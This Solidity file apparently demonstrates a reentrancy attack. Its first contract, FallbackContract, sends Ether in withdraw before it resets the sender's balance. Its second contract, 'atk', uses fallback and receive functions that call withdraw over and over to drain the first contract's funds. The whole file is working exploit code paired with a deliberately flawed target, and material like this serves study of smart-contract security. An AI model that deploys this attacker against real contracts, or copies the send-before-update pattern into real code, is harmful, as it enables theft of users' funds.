// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.5.0 <0.9.0;
contract FallbackContract {
    mapping(address=>uint) public balances;
    function deposit() external payable{
        require(msg.value>=1 ether,"give some value");
        balances[msg.sender] +=msg.value;
    }
    function withdraw() public{
        require(balances[msg.sender]>0,"you donot have any balance");
        uint bal= balances[msg.sender];
        (bool sent,) =msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");
        balances[msg.sender] = 0;
    } 

}

contract atk{
    FallbackContract public obj;
    event log(string _fun,address _sender, uint _val, bytes data);

    constructor(address _objaddress){
        obj= FallbackContract(_objaddress);
    }

    fallback() external payable {
        if (address(obj).balance >= 1 ether) {
            obj.withdraw();
            emit log("fallback", msg.sender,msg.value, msg.data);
        }
     }
     receive() external payable { 
        if(address(obj).balance>=1 ether){
            obj.withdraw();
            emit log("recieve",msg.sender,msg.value,"");
        }
     }
     function attack() public payable{
        require(msg.value>=1 ether,"you donot have value");
        obj.deposit{value : 1 ether}();
        obj.withdraw();
     }

}
